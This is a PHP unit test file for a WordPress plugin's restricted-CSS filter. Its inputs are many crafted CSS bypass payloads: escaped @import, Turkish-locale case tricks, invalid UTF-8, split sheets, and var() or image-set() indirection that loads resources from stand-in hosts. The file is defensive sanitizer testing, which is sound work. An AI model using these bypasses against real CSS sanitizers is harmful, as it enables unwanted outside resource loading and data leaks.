			$this->assertSame( '.dopo{color:green}', $filter( $rule . '.dopo{color:green}' ), $name );
			$this->assertSame( '@layer a;.dopo{color:green}', $filter( '@layer a;' . $rule . '.dopo{color:green}' ), $name . ' (after a layer statement)' );
			$this->assertSame( 'color:green', $filter( $rule . 'color:green', 'styles' ), $name . ' (style)' );
			$this->assertSame( '.dopo{color:green}', $this->printed( array( $rule . '.dopo{color:green}' ), array() ), $name . ' (printed)' );
		}
		// Whatever is written around it, the keyword is not there for any reading: a `;` in its string or its address,
		// inside a rule, before a block, left open, after an address without quotes that holds a comment opener, after
		// `<!--`, after a character that is not ASCII, with an escape or a `-` right after it.
		foreach ( array(
			'@namespace "a;b";.dopo{color:green}',
			'@namespace url(/a;b);.dopo{color:green}',
			'.a{color:red;@namespace "y"}.dopo{color:green}',
			'@namespace x {a:b;c:d}.dopo{color:green}',
			'.a{color:red}@namespace "y"',
			'@namespace "y',
			'@layer url(/*);@namespace "y";.dopo{color:green} /* */',
			'<!--url(/*)@font-face{@namespace "y";/**//* c */)',
			".a{background:\u{a0}url(/*)}@namespace \"y\";.dopo{color:green} /* */",
			'@namespace\\31 "y";@namespace-x "y";.dopo{color:green}',
			"@namespace\u{a0}\"y\";.dopo{color:green}",
			'a@namespace x;b{color:red}',
			'.a{b:u@namespace x;rl(/a.png)}',
			'/@namespace x;* @namespace "y"; */.a{color:red}',
		) as $css ) {
			foreach ( array( 'globals', 'styles' ) as $key ) {
				$once = $filter( $css, $key );
				$this->assertDoesNotMatchRegularExpression( $keyword, $once, $key . ': ' . $css );
				// What comes back comes back again.
				$this->assertSame( $once, $filter( $once, $key ), $key . ': ' . $css );
			}
			$this->assertDoesNotMatchRegularExpression( $keyword, $this->printed( array( $css ), array( array( '.s', $css ) ) ), $css );
		}
		// Cut between two sheets, the page prints a new line between them: neither half is a rule, and the keyword goes.
		foreach ( array( array( '@namespace', '"y";.dopo{color:green}' ), array( '@namespac\\65', '"y";.dopo{color:green}' ), array( '@name', 'space "y";.dopo{color:green}' ) ) as $sheets ) {
			$this->assertDoesNotMatchRegularExpression( $keyword, $this->printed( $sheets, array() ), implode( ' + ', $sheets ) );
		}
		// The price, the same as for @import: what only names it goes too, in a comment, a string or an address, up to
		// the next `;`, and what it was written in may be left open. No sheet of a real site names it.
		foreach ( array(
			'/* @namespace "y"; */ .dopo{color:green}'                      => '/*  */ .dopo{color:green}',
			'/* vedi @namespace */ .a{color:red;gap:0} .dopo{color:green}'  => '/* vedi gap:0} .dopo{color:green}',
			'.a::before{content:"@namespace"} .dopo{color:green;gap:0}'     => '.a::before{content:"gap:0}',
			'.a{background:url("/img/@namespace.png");color:red}'           => '.a{background:url()"/img/color:red}',
		) as $css => $left ) {
			$this->assertSame( $left, $filter( $css ), $css );
		}
		// Another keyword stays, and a sheet that never names it comes back byte for byte, as before.
		foreach ( array(
			'@namespaces "y";@namespace_x "y";@namespace1 "y";.dopo{color:green}',
			'@layer a, b;@media (width < 48em){.a{color:red}} .b::after{content:"\\201C";background:url(/a.png)} .md\\:hidden{display:none} /* fine */',
		) as $benign ) {
			$this->assertSame( $benign, $filter( $benign ), $benign );
		}
	}

	/**
	 * The filter reads the same in every PHP locale. PCRE takes the case of a letter and what `\b`, `\s` and `\w` mean
	 * from the tables of the locale, and so do ctype_*() and substr_compare() without case: in a Turkish locale `I` is
	 * not the capital of `i`, and `@IMPORT "https://other.example/a.css";` or `IMAGE-SET("https://other.example/a.png"
	 * 1x)` came back as written, while a browser reads them as @import and image-set( (threat model T31, P1 of the
	 * ninth review). Skipped where the machine has no Turkish locale: one is made with `localedef -i tr_TR -f UTF-8
	 * <folder>/tr_TR.UTF-8` and found through LOCPATH.
	 */
	public function test_restricted_css_reads_the_same_in_a_turkish_locale(): void {
		$filter = static fn ( string $css, string $key ): string => \XB\Versioning\Documents::restricted_styles( array( $key => array( array( 'selector' => '.s', 'css' => $css ) ) ) )[ $key ][0]['css'];
		$sheets = array(
			'@IMPORT "https://altro.example/a.css";'                                 => '',
			'@Import url(https://altro.example/a.css);'                              => '',
			'@\\49 MPORT "https://altro.example/a.css";'                             => '',
			'.a{background:IMAGE-SET("https://altro.example/a.png" 1x)}'             => '.a{background:none}',
			'.a{background:-WEBKIT-IMAGE-SET("https://altro.example/a.png" 1x)}'     => '.a{background:none}',
			'.a{background:Image\\2D Set("https://altro.example/a.png" 1x)}'         => '.a{background:none}',
			'.a{background:URL(https://altro.example/a.png)}'                        => '.a{background:url()}',
			'.a{background:url(FILE://altro.example/a.png)}'                         => '.a{background:url()}',
			'@NAMESPACE "y";.a{gap:0}'                                               => '.a{gap:0}',
			'.a{background:IMAGE-SET("/wp-content/a.png" 1x);content:"İ ı I i"}'    => '.a{background:IMAGE-SET("/wp-content/a.png" 1x);content:"İ ı I i"}',
			'.a{color:red;@MEDIA (width < 40em){&__b{background:IMAGE-SET("//altro.example/a.png" 1x)}}}' => '.a{color:red;@MEDIA (width < 40em){&__b{background:none}}}',
		);
		// Every sheet as a global sheet and as a style, in the order of the list.
		$read = static function () use ( $filter, $sheets ): array {
			$out = array();
			foreach ( array_keys( $sheets ) as $css ) {
				$out[] = $filter( $css, 'globals' );
				$out[] = $filter( $css, 'styles' );
			}
			return $out;
		};
		$plain = $read();
		foreach ( array_values( $sheets ) as $i => $kept ) {
			$this->assertSame( array( $kept, $kept ), array_slice( $plain, 2 * $i, 2 ), 'no locale: ' . array_keys( $sheets )[ $i ] );
		}
		$before  = (string) setlocale( LC_CTYPE, '0' );
		$turkish = array();
		foreach ( array( 'tr_TR.UTF-8', 'tr_TR.utf8', 'tr_TR.ISO-8859-9', 'tr_TR.iso88599', 'tr_TR' ) as $name ) {
			// A C library may take any name and keep its own tables (musl): Turkish is the locale where, for PCRE, `I`
			// and `i` are two letters.
			if ( false !== setlocale( LC_CTYPE, $name ) && 0 === preg_match( '/i/i', 'I' ) ) {
				$turkish[] = $name;
			}
		}
		setlocale( LC_CTYPE, $before );
		if ( array() === $turkish ) {
			$this->markTestSkipped( 'No Turkish locale on this machine (tr_TR.UTF-8, tr_TR.ISO-8859-9): the filter was read with no locale only.' );
		}
		try {
			foreach ( $turkish as $name ) {
				setlocale( LC_CTYPE, $name );
				$this->assertSame( $plain, $read(), $name );
			}
		} finally {
			setlocale( LC_CTYPE, $before );
		}
	}

	/**
	 * CSS that is not valid UTF-8 is not judged: the entry keeps no CSS. What writes the document after the filter may
	 * read those bytes otherwise (a JSON encoder that repairs a string drops them, and `@imp<FF>ort` is `@import`
	 * then), so the filter answers only for text. The same for the selector and the linked media, which go into the CSS
	 * judged and printed (threat model T31, P2 of the ninth review). Valid UTF-8 comes back as written.
	 */
	public function test_restricted_css_that_is_not_utf8_keeps_no_css(): void {
		$filter = static fn ( array $entry, string $key ): string => \XB\Versioning\Documents::restricted_styles( array( $key => array( $entry ) ) )[ $key ][0]['css'];
		$uuid   = '11111111-1111-4111-8111-111111111111';
		$wrong  = array(
			'a byte alone'              => array( 'selector' => '.s', 'css' => ".a{gap:0}\xFF" ),
			'@import around a byte'     => array( 'selector' => '.s', 'css' => "@imp\xFFort \"https://altro.example/a.css\";" ),
			'@namespace around a byte'  => array( 'selector' => '.s', 'css' => "@name\xFFspace \"y\";.a{gap:0}" ),
			'url( around a byte'        => array( 'selector' => '.s', 'css' => ".a{background:u\xFFrl(https://altro.example/a.png)}" ),
			'a sequence cut short'      => array( 'selector' => '.s', 'css' => ".a{content:\"\xC3\"}" ),
			'a sequence too long'       => array( 'selector' => '.s', 'css' => ".a{content:\"\xC0\xAF\"}" ),
			'half a surrogate pair'     => array( 'selector' => '.s', 'css' => ".a{content:\"\xED\xA0\x80\"}" ),
			'past the last code point'  => array( 'selector' => '.s', 'css' => ".a{content:\"\xF4\x90\x80\x80\"}" ),
			'Latin-1 text'              => array( 'selector' => '.s', 'css' => ".a{content:\"perch\xE9\"}" ),
			'the selector'              => array( 'selector' => ".s\xFF", 'css' => '.a{gap:0}' ),
			'the reference of a media'  => array( 'selector' => '.s', 'css' => '.a{gap:0}', 'assets' => array( array( 'reference' => "a\xFF.png", 'assetId' => $uuid ) ) ),
			'a key of a media'          => array( 'selector' => '.s', 'css' => '.a{gap:0}', 'assets' => array( array( "refer\xFFence" => 'a.png', 'assetId' => $uuid ) ) ),
		);
		foreach ( $wrong as $what => $entry ) {
			foreach ( array( 'globals', 'styles' ) as $key ) {
				$this->assertSame( '', $filter( $entry, $key ), "$what, $key" );
			}
		}
		$text = array(
			'.a{content:"è € 😀 İ ı"}',
			".a{content:\"\u{FFFD} \u{FFFE} \u{10FFFF}\"}",
			'.a{background:url(/wp-content/è.png)}',
		);
		foreach ( $text as $css ) {
			foreach ( array( 'globals', 'styles' ) as $key ) {
				$this->assertSame( $css, $filter( array( 'selector' => '.è', 'css' => $css, 'assets' => array( array( 'reference' => 'è.png', 'assetId' => $uuid ) ) ), $key ), "$css, $key" );
			}
		}
		// Only the entry that holds the bytes: the ones next to it are judged as ever.
		$sheets = \XB\Versioning\Documents::restricted_styles(
			array(
				'globals' => array(
					array( 'id' => 'a', 'css' => '.a{gap:0}' ),
					array( 'id' => 'b', 'css' => ".b{gap:0}\xFF" ),
					array( 'id' => 'c', 'css' => '.c{background:url(https://altro.example/a.png)}' ),
				),
			)
		)['globals'];
		$this->assertSame( array( '.a{gap:0}', '', '.c{background:url()}' ), array_column( $sheets, 'css' ) );
	}

	/**
	 * Sheets and styles are printed one after the other, a new line between them: CSS that leaves a url(, an
	 * image-set( or an escape open at its end would take what is printed next as its address. Before, two global
	 * sheets `.a{background:url(` and `https://other.example/x)}` passed the filter one by one (threat model T31).
	 */
	public function test_restricted_css_leaves_nothing_open_for_what_is_printed_next(): void {
		$home = (string) wp_parse_url( home_url(), PHP_URL_HOST );
		foreach ( array(
			'url( and its address'             => array( '.s{background:url(', 'https://altro.sito/x)}' ),
			'url( and a quoted address'        => array( '.s{background:url( ', '"https://altro.sito/x")}' ),
			'image-set( and its string'        => array( '.s{background:image-set(', '"https://altro.sito/x" 1x)}' ),
			'image-set( behind a comment'      => array( '.s{background:image-set(/*', '*/"https://altro.sito/x" 1x)}' ),
			'a line continued in a string'     => array( '.s{background:url("https://' . $home . '\\', '.altro.sito/x")}' ),
			'the same in image-set'            => array( '.s{background:image-set("https://' . $home . '\\', '.altro.sito/x" 1x)}' ),
			'an escape ended by the new line'  => array( '.s{background:\\75', 'rl(https://altro.sito/x)}' ),
			'the same, six digits'             => array( '.s{background:ur\\00006c', '(https://altro.sito/x)}' ),
			'the same, with a carriage return' => array( ".s{background:\\75\r", 'rl(https://altro.sito/x)}' ),
			'the hyphen of image-set'          => array( '.s{background:image\\2d', 'set("https://altro.sito/x" 1x)}' ),
			'@import and its address'          => array( '@import', '"https://altro.sito/s.css";' ),
			'an escape left last by a removal' => array( '.s{background:image\\2d@import x', 'set("https://altro.sito/x" 1x)}' ),
			'the same, after a url( closed'    => array( '.s{background:url( a b \\75', 'rl(https://altro.sito/x)}' ),
		) as $name => $sheets ) {
			$out = $this->printed( $sheets, array() );
			$this->assertDoesNotMatchRegularExpression( '/(?:url|image-set|src)\([^)]*altro\.sito|@import/i', (string) preg_replace( '/\s+/', '', $out ), $name . ': ' . $out );
			// No escape is left for the new line to end: `\75` and, on the next line, `rl(` are url( for the browser.
			$this->assertDoesNotMatchRegularExpression( '/\\\\[0-9a-fA-F]{0,6}\r?\n/', $out, $name . ': ' . $out );
		}
		// Between styles: the comment hides what the compiler prints between the two, the selector of the next style
		// closes the address and adds an option.
		foreach ( array(
			'a comment up to the next style' => array( array( '.s', '&:hover{background:image-set(/*}' ), array( '.x', 'c:*/"https://altro.sito/x" 1x)' ) ),
			'the selector of the next style' => array( array( '.s', 'background:image-set(url(' ), array( ') type("x/y"), "https://altro.sito/x" 1x), .x', 'color:red' ) ),
		) as $name => $styles ) {
			$this->assertDoesNotMatchRegularExpression( '/image-set\((?!\))/', $this->printed( array(), $styles ), $name );
		}
		// A style is judged with its own selector too: here it would become part of the address, before its `@`.
		$css = '&__y{z:@' . $home . '/" ) ;c:"x"y"} background:url("https://' . $home . '\\';
		$out = $this->printed( array(), array( array( ".s,[x='@altro.sito/x']", $css ) ) );
		$this->assertDoesNotMatchRegularExpression( '/url\("https:/', $out, $out );
		// CSS that only names a function in a comment or a string keeps the closer and the quote: before, the filter cut
		// to the end of the sheet, and the comment or the rule left open took all the CSS printed after it.
		foreach ( array(
			'/* TODO: src ( da sistemare */ .a{color:rgb(0 0 0)}'  => '.a{color:rgb(0 0 0)}.b{color:red}.s{color:blue;}',
			'/* image-set( non chiusa */ .a{color:rgb(0 0 0)}'     => '.a{color:rgb(0 0 0)}.b{color:red}.s{color:blue;}',
			'.a::after{content:"image-set("} .a{color:rgb(1 2 3)}' => '.a::after{content:"image-set()"}.a{color:rgb(1 2 3)}.b{color:red}.s{color:blue;}',
			'.a::after{content:"url("} .a{color:green}'            => '.a::after{content:"url()"}.a{color:green}.b{color:red}.s{color:blue;}',
			'/* TODO: url( da mettere */ .a{color:rgb(0 0 0)}'     => '.a{color:rgb(0 0 0)}.b{color:red}.s{color:blue;}',
			'/* usa url( "/x.png" ) oppure url( da decidere */ .a{color:rgb(0 0 0)}' => '.a{color:rgb(0 0 0)}.b{color:red}.s{color:blue;}',
			'.a::after{content:"vedi url( qui"} .a{color:rgb(1 2 3)}' => '.a::after{content:"vedi url() qui"}.a{color:rgb(1 2 3)}.b{color:red}.s{color:blue;}',
		) as $sheet => $page ) {
			$this->assertSame( $page, $this->printed( array( $sheet, '.b{color:red}' ), array( array( '.s', 'color:blue' ) ) ), $sheet );
		}
		// A global sheet is printed with `</` written as `\3C /`: judged in that form too (after a backslash the escape
		// made `//`, the start of an address of another site).
		foreach ( array( '.s{background:url("/\\<//altro.sito/x")}', '.s{background:image-set("/\\<//altro.sito/x" 1x)}' ) as $sheet ) {
			$this->assertStringNotContainsString( 'altro.sito', $this->printed( array( $sheet ), array() ), $sheet );
		}
		$this->assertSame( '.a{content:"a</b"}', \XB\Versioning\Documents::restricted_styles( array( 'globals' => array( array( 'css' => '.a{content:"a</b"}' ) ) ) )['globals'][0]['css'] );
		// What is closed stays byte for byte, an escape at the very end is cut.
		$this->assertSame( '.a{color:red', \XB\Versioning\Documents::restricted_styles( array( 'globals' => array( array( 'css' => '.a{color:red' ) ) ) )['globals'][0]['css'] );
		$this->assertSame( '.a{content:"x', \XB\Versioning\Documents::restricted_styles( array( 'globals' => array( array( 'css' => '.a{content:"x\\' ) ) ) )['globals'][0]['css'] );
	}

	/**
	 * What the filter gives back it gives back again, and it never ends in an escape: so nothing it took out left
	 * something for a second reading, or for the new line the page prints after it (threat model T31; a url( closed
	 * where it opens once left the backslash after it as the last character).
	 */
	public function test_restricted_css_comes_back_the_same_when_filtered_again(): void {
		$home   = (string) wp_parse_url( home_url(), PHP_URL_HOST );
		$sheets = array(
			'round:-\\77 ebkit-image-set(url(https://altro.sito/9) \\/*a 1x)',
			'background:image\\2d@import x',
			'background:url( a b \\',
			'background:url(/a.png',
			'content:"url(";color:red',
			'/* TODO: url( da mettere */ color:red',
			'background:url("https://' . $home . '\\',
			'background:image-set("https://altro.sito/x" 1x;color:red',
			'background:image-set(url(/a/*b.png) 1x, "https://altro.sito/x" 2x);x:y("*/ ))',
			'a:url(https://altro.sito/1);b:\\5c 75rl(https://altro.sito/2)',
			'@imp@import x;ort "https://altro.sito/s.css";color:red',
			'--x:"https://altro.sito/x";background:image-set(var(--x) 1x) \\2d',
			'background:url(https://altro.sito/x) \\75',
			'color:red;background:url(/ok.png) /* fine */',
		);
		foreach ( $sheets as $css ) {
			foreach ( array( 'styles', 'globals' ) as $key ) {
				$once  = \XB\Versioning\Documents::restricted_styles( array( $key => array( array( 'selector' => '.s', 'css' => $css ) ) ) )[ $key ][0]['css'];
				$twice = \XB\Versioning\Documents::restricted_styles( array( $key => array( array( 'selector' => '.s', 'css' => $once ) ) ) )[ $key ][0]['css'];
				$this->assertSame( $once, $twice, $key . ': ' . $css );
				$this->assertDoesNotMatchRegularExpression( '/\\\\[0-9a-fA-F]{0,6}\r?\z/', $once, $key . ': ' . $css );
				$this->assertStringNotContainsString( 'altro.sito/', (string) preg_replace( '/"https:\/\/altro\.sito\/x";background:none/', '', $once ), $key . ': ' . $css );
			}
		}
	}

	/**
	 * image-set() takes a string as an address wherever the string comes from: `--x:"https://other.example/x"` is no
	 * address where it is written, and `image-set(var(--x) 1x)` loads it. An image-set() with an option that stands
	 * for other text becomes `none`; so does one whose address without quotes holds a comment opener or a `;`, which
	 * before hid the options after it (threat model T31).
	 */
	public function test_restricted_css_refuses_an_image_set_that_takes_its_string_from_elsewhere(): void {
		$filter = static fn ( string $css ): string => \XB\Versioning\Documents::restricted_styles( array( 'styles' => array( array( 'selector' => '.s', 'css' => $css ) ) ) )['styles'][0]['css'];
		foreach ( array(
			'var()'                 => '--x:"https://altro.sito/x";background:image-set(var(--x) 1x)',
			'var(), webkit'         => '--x:"https://altro.sito/x";background:-webkit-image-set(var(--x) 1x)',
			'var() with an escape'  => '--x:"https://altro.sito/x";background:image-set(v\\61r(--x) 1x)',
			'var() after an option' => '--x:"https://altro.sito/x";background:image-set(url(/a.png) 1x, var(--x) 2x)',
			'src(var())'            => '--x:"https://altro.sito/x";background:src(var(--x))',
			'attr()'                => 'background:image-set(attr(data-src) 1x)',
			'a custom function'     => 'background:image-set(--pick() 1x)',
		) as $name => $css ) {
			$this->assertStringNotContainsString( 'image-set(', $filter( $css ), $name );
			$this->assertStringNotContainsString( 'src(', $filter( $css ), $name );
		}
		foreach ( array(
			'a ; in an address without quotes'  => 'background:image-set(url(/a;b.png) 1x, "https://altro.sito/x" 2x)',
			'a comment opener in an address'    => 'background:image-set(url(/a/*b.png) 1x, "https://altro.sito/x" 2x);x:y("*/ ))',
		) as $name => $css ) {
			$this->assertStringNotContainsString( 'altro.sito', $filter( $css ), $name );
		}
		// The options a real sheet writes stay byte for byte, var() inside a gradient too.
		foreach ( array(
			'background:image-set("/a.png" 1x, url(/b.png) 2x)',
			'background:image-set(url("/a.png") type("image/png") 1x, "/b.avif" type("image/avif") calc(1x + 1x))',
			'background:image-set(linear-gradient(var(--a), rgb(0 0 0 / 50%)) 1x, url(/a;b.png) 2x)',
			'--x:"/a.png";background:var(--x)',
		) as $benign ) {
			$this->assertSame( $benign, $filter( $benign ), $benign );
		}
	}

	/**
	 * Named queries are written into the sheet when the page prints, after the filter: only in the prelude of a real
	 * @media or @container rule, and never next to a name. Before, `content:"@media" ur(--x)` with `x` saved as
	 * `l(https://other.example/x)` printed a url() (threat model T31).
	 */
	public function test_named_queries_put_no_resource_together(): void {
		$queries = array( 'x' => 'l(https://altro.sito/x)', 'y' => 'ur', 'z' => '//altro.sito/x', 'w' => 'l(altro.sito)', 'tablet' => '(width < 64em)' );
		foreach ( array(
			'N3, ur(--x) after a string'        => array( array(), array( array( '.s', '&::before{content:"@media" ur(--x)}' ) ) ),
			'N3, the same with a clean query'   => array( array(), array( array( '.s', '&::before{content:"@media" ur(--w)}' ) ) ),
			'N3b, after a comment'              => array( array( '.a{background:/*@media*/ur(--x)}' ), array() ),
			'N3c, inside the string of url()'   => array( array(), array( array( '.s', 'content:"@media" url("(--z)")' ) ) ),
			'N3d, (--y)l('                      => array( array(), array( array( '.s', 'content:"@media" (--y)l(https://altro.sito/x)' ) ) ),
			'in a real prelude, before a name'  => array( array( '@media (--y)l(https://altro.sito/x){.a{color:red}}' ), array() ),
			'in a real prelude, after a name'   => array( array( '@media ur(--x){.a{color:red}}' ), array() ),
		) as $name => $case ) {
			$out = $this->printed( $case[0], $case[1], $queries );
			$this->assertDoesNotMatchRegularExpression( '/url\([^)]*altro\.sito|"\/\/altro\.sito/i', $out, $name . ': ' . $out );
		}
		// The queries a builder saves name no resource.
		foreach ( array( 'l(https://altro.sito/x)', '//altro.sito/x', 'image-set(a)', 'src(a)', 'url (a)' ) as $query ) {
			try {
				\XB\Styles\NamedQueries::validate( array( 'x' => $query ) );
				$this->fail( $query );
			} catch ( \InvalidArgumentException $e ) {
				$this->assertStringContainsString( '"x"', $e->getMessage() );
			}
		}
		$this->assertSame( array( 'print' => 'print', 'wide' => 'screen and (min-aspect-ratio: 16/9)' ), \XB\Styles\NamedQueries::validate( array( 'wide' => 'screen  and (min-aspect-ratio: 16/9)', 'print' => 'print' ) ) );
		// An @media without a block, closed by the brace of the rule around it: its prelude ends there. Before, it ran on
		// to the next `{` and the rules in between were printed twice, the first time cut short.
		$this->assertSame(
			'.a{color:red;@media print}@media (width < 64em){.b{color:blue}}.card{padding:2rem;@media (width < 64em){padding:1rem}}.piede{color:gray;}',
			$this->printed( array( '.a{color:red;@media print}', '@media (--tablet){.b{color:blue}}' ), array( array( '.card', 'padding:2rem;@media (--tablet){padding:1rem}' ), array( '.piede', 'color:gray' ) ), $queries )
		);
		// Real uses keep working: at the top, nested in a rule, in @container, two names in one prelude.
		$this->assertSame(
			'@media (width < 64em){.a{color:red}}.c{@container card (width < 64em){gap:0}}@media (width < 64em) and (width < 64em){.d{x:1}}.b{@media (width < 64em){color:blue}}',
			$this->printed( array( '@media (--tablet){.a{color:red}}', '.c{@container card (--tablet){gap:0}}', '@media (--tablet) and (--tablet){.d{x:1}}' ), array( array( '.b', '@media (--tablet){color:blue}' ) ), $queries )
		);
	}

	/**
	 * The media linked to a rule (`assets`) are written into its CSS after the filter, each time the page is printed
	 * (StyleRegistry, CssAssets::rewrite()), by a reader of url() that is neither the filter's nor the browser's. The
	 * filter judges the CSS in that form too, with the media found and with the media gone (threat model T31, T1 of the
	 * third review). Checked on the text the page prints: sheets with linked media keep their CSS byte for byte, the
	 * page prints the address of the media, or `url()` for a media that is gone, and that printed text, read again by
	 * the filter, loses nothing.
	 * What this test does not prove: no sheet is known that the judgement of the rewritten form refuses, so nothing here
	 * turns red without it. It proves that sheets with media are still printed, and printed as they were judged.
	 */
	public function test_restricted_css_with_linked_media_is_printed_as_it_was_judged(): void {
		$base  = wp_upload_dir()['baseurl'] . '/xb-test-t1/';
		$ids   = array();
		$files = array( 'hero.png', 'hero-2x.png', 'card.webp', 'titolo.woff2' );
		foreach ( $files as $index => $file ) {
			$attachment = wp_insert_post(
				array(
					'post_type'      => 'attachment',
					'post_status'    => 'inherit',
					'post_mime_type' => 'image/png',
					'post_title'     => 'T1 ' . $file,
					'guid'           => $base . $file,
				),
				true
			);
			$this->assertIsInt( $attachment );
			$this->track( $attachment );
			$ids[ $file ] = sprintf( '550e8400-e29b-41d4-a716-4466554407%02d', $index );
			update_post_meta( $attachment, '_wp_attached_file', 'xb-test-t1/' . $file );
			update_post_meta( $attachment, '_xb_page_profile_id', $ids[ $file ] );
		}
		// A media that was linked and is no longer in the library: the page prints `url()` in its place.
		$gone = '550e8400-e29b-41d4-a716-446655440799';
		$link = static fn ( string $reference, string $asset_id ): array => array( 'reference' => $reference, 'assetId' => $asset_id );

		$styles  = array(
			array( 'id' => 'hero', 'selector' => '.hero', 'css' => 'background-image:url(/media/hero.png?v=2)', 'assets' => array( $link( '/media/hero.png?v=2', $ids['hero.png'] ) ) ),
			array( 'id' => 'set', 'selector' => '.set', 'css' => "background-image:image-set(url( 'media/hero.png' ) 1x, url(\"media/hero@2x.png\") 2x)", 'assets' => array( $link( 'media/hero.png', $ids['hero.png'] ), $link( 'media/hero@2x.png', $ids['hero-2x.png'] ) ) ),
			array( 'id' => 'card', 'selector' => '.card', 'css' => 'color:red; &__img{background:url(media/card.webp#a)} &:hover{background:url(media/perso.png) no-repeat}', 'assets' => array( $link( 'media/card.webp#a', $ids['card.webp'] ), $link( 'media/perso.png', $gone ) ) ),
		);
		$globals = array(
			array( 'id' => 'font', 'css' => '@font-face{font-family:"Titolo";src:url("fonts/titolo.woff2") format("woff2");font-display:swap}', 'assets' => array( $link( 'fonts/titolo.woff2', $ids['titolo.woff2'] ) ) ),
			array( 'id' => 'note', 'css' => '/* sfondo: media/hero.png */ .hero::before{content:"media/hero.png"} @media (min-width:800px){.hero{background:url(media/hero.png)}} .logo{background:url(/wp-content/uploads/logo.png)}', 'assets' => array( $link( 'media/hero.png', $ids['hero.png'] ) ) ),
		);

		$payload = array( 'styles' => $styles, 'globals' => $globals );
		$stored  = \XB\Versioning\Documents::restricted_styles( $payload );
		$this->assertSame( $payload, $stored, 'CSS with linked media of this site comes back as written, with its mappings' );
		$this->assertSame( $stored, \XB\Versioning\Documents::restricted_styles( $stored ), 'and again when filtered twice' );

		$this->set_option( 'xb_styles', $stored['styles'] );
		$this->set_option( 'xb_global_styles', $stored['globals'] );
		$printed = \XB\Plugin::instance()->styles->all_css();

		foreach ( array( 'hero.png?v=2', 'hero.png', 'hero-2x.png', 'card.webp#a', 'titolo.woff2' ) as $address ) {
			$this->assertStringContainsString( 'url("' . $base . $address . '")', $printed, $address );
		}
		$this->assertStringContainsString( '&:hover{background:url() no-repeat}', $printed, 'a media that is gone prints an empty url()' );
		$this->assertStringContainsString( '/* sfondo: media/hero.png */ .hero::before{content:"media/hero.png"}', $printed, 'a comment and a string are not rewritten' );
		$this->assertStringContainsString( '.logo{background:url(/wp-content/uploads/logo.png)}', $printed, 'an address that is not linked stays as written' );
		$this->assertDoesNotMatchRegularExpression( '/url\(\s*["\']?\/?(?:media|fonts)\//', $printed, 'no linked reference is printed unresolved' );

		// The printed text holds nothing the filter would take out: handed to it as one sheet, it comes back the same.
		$again = \XB\Versioning\Documents::restricted_styles( array( 'globals' => array( array( 'css' => $printed ) ) ) )['globals'][0]['css'];
		$this->assertSame( $printed, $again, 'the page prints what the filter judged' );
	}

	/**
	 * The judgement of the CSS as printed with its media, seen at work on harmless sheets (Q4 of the fourth review): the
	 * address that stands for a linked media is handed in, and when it is one of another site a sheet that uses a linked
	 * media is left with no CSS. So the filter did read the text that CssAssets::rewrite() writes. Without that
	 * judgement in Documents::restricted_styles_with() this test is red: both sheets would keep their CSS.
	 */
	public function test_restricted_css_is_judged_as_printed_with_its_media(): void {
		$judge   = new \ReflectionMethod( \XB\Versioning\Documents::class, 'restricted_styles_with' );
		$link    = array( array( 'reference' => 'media/hero.png', 'assetId' => '550e8400-e29b-41d4-a716-446655440701' ) );
		$payload = array(
			'styles'  => array( array( 'id' => 'hero', 'selector' => '.hero', 'css' => 'background-image:url(media/hero.png)', 'assets' => $link ) ),
			'globals' => array( array( 'id' => 'foglio', 'css' => '.hero::after{background:url("media/hero.png")}', 'assets' => $link ) ),
		);
		$this->assertSame( $payload, $judge->invoke( null, $payload, home_url( '/wp-content/uploads/xb-media' ) ), 'an address of this site: nothing to take out' );

		$judged = $judge->invoke( null, $payload, 'https://other.example/uploads/xb-media' );
		$this->assertSame( '', $judged['styles'][0]['css'], 'the style was judged with the address written in' );
		$this->assertSame( '', $judged['globals'][0]['css'], 'and so was the global sheet' );

		// A mapping that no url() of the sheet uses writes nothing, and nothing is lost whatever the address.
		$unused = array( array( 'reference' => 'media/altro.png', 'assetId' => '550e8400-e29b-41d4-a716-446655440701' ) );
		$other  = array(
			'styles'  => array( array( 'id' => 'hero', 'selector' => '.hero', 'css' => 'background-image:url(media/hero.png)', 'assets' => $unused ) ),
			'globals' => array( array( 'id' => 'foglio', 'css' => '.hero::after{background:url("media/hero.png")}', 'assets' => $unused ) ),
		);
		$this->assertSame( $other, $judge->invoke( null, $other, 'https://other.example/uploads/xb-media' ) );
	}
}
